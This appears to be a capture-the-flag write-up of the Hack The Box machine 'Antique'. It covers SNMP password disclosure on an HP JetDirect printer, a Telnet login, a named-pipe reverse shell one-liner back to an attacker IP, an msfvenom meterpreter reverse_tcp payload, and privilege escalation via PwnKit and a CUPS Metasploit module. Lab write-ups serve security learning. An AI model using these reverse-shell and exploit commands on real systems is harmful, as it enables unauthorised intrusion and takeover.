# -HTB-Antique

## Nmap Scan (TCP)
### We started with a full TCP port scan to identify open services.

```
nmap -p- -sVC -vv -oN nmap_scan --min-rate=5000 10.10.11.107
```

<img width="938" height="831" alt="image" src="https://github.com/user-attachments/assets/8d48f71f-6a74-4cce-9adc-e6eae7af2ba0" />


## Nmap Scan (UDP) 

```
nmap -p- -Pn  -sU -vv -oN nmap_scan_UDP --min-rate=5000 10.10.11.107
```

<img width="827" height="484" alt="image" src="https://github.com/user-attachments/assets/6402d272-c59e-4775-b3e9-a2bcdcb77fd5" />



## SNMP Enumeration

### We used snmpbulkwalk to query the public community string.

```
snmpbulkwalk -c public -v2c 10.10.11.107 
```
<img width="416" height="69" alt="image" src="https://github.com/user-attachments/assets/e15670ba-b531-4f32-97ab-74cbcefd2289" />


### Validating the Telnet banner confirms the device is an HP JetDirect Printer. 

```
nc -vn 10.10.11.107 23
```

<img width="418" height="154" alt="image" src="https://github.com/user-attachments/assets/d9d7e83e-5f89-4f36-a24f-0b704ad89f57" />


## Searching for "HP JetDirect" on Exploit-DB reveals a known issue: "HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure" (Exploit-DB ID: 22319)

<img width="942" height="104" alt="image" src="https://github.com/user-attachments/assets/47586ba1-3f29-4931-8ade-e208018b039d" />

## The SNMP output contained a hex string representing the password. 

<img width="955" height="652" alt="image" src="https://github.com/user-attachments/assets/6c87d33b-7a95-4789-b3ee-d5a53b7b659a" />

# And we will find the user flag 

<img width="609" height="713" alt="image" src="https://github.com/user-attachments/assets/38bf4de9-3918-4b09-b350-b0afebabbe4f" />

## Using the credentials, we connected via Telnet. Since Telnet is not a proper shell, we upgraded to a reverse shell using a named pipe :

```
#Local 
nc -lvnp 1337

# Payload 
exec TF=$(mktemp -u);mkfifo $TF && telnet <YOUR_IP> 1337 0<$TF | bash 1>$TF
```



## Running enumeration scripts (linpeas) revealed an outdated sudo version vulnerable to CVE-2021-4034 (PwnKit).


<img width="800" height="86" alt="image" src="https://github.com/user-attachments/assets/afc191c6-2fee-4a7f-963b-1399e744f53d" />


## Using a pre-compiled exploit for CVE-2021-4034 gave immediate root access.

<img width="404" height="228" alt="image" src="https://github.com/user-attachments/assets/63dd7e55-e1f5-4546-a181-e39fc533b0a5" />


## Method B: Intended Way (CUPS Exploit)

## Further manual enumeration showed a service listening on local port 631.

```
netstat -tulpn | grep LIS
```

<img width="776" height="97" alt="image" src="https://github.com/user-attachments/assets/a895f473-56f0-4c76-875f-b4cad691715d" />


## I downloaded the page content, and inside `index.html` we can see it is running **"CUPS 1.6.1"**.


```
wget http://localhost:631
```
<img width="482" height="164" alt="image" src="https://github.com/user-attachments/assets/f811b4cb-da32-4ff8-baba-ec14f504f78b" />

## If we search on Google, we can find that a **Metasploit** module exists for this specific version.

<img width="799" height="468" alt="image" src="https://github.com/user-attachments/assets/dc38d0d6-8b5f-4370-81bc-cd0f8b2735f8" />

## We need a session to run this exploit, so let's get one

<img width="937" height="574" alt="image" src="https://github.com/user-attachments/assets/81a5e90a-72fa-4e0b-b7fa-47fc6736c2ae" />


## To capture the session, I used:
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o session
```

<img width="946" height="908" alt="image" src="https://github.com/user-attachments/assets/6ac389c3-bc27-4765-8498-41fc74a83147" />

# Root

<img width="802" height="74" alt="image" src="https://github.com/user-attachments/assets/eb439a60-1912-4427-bb74-19b34851aa3e" />




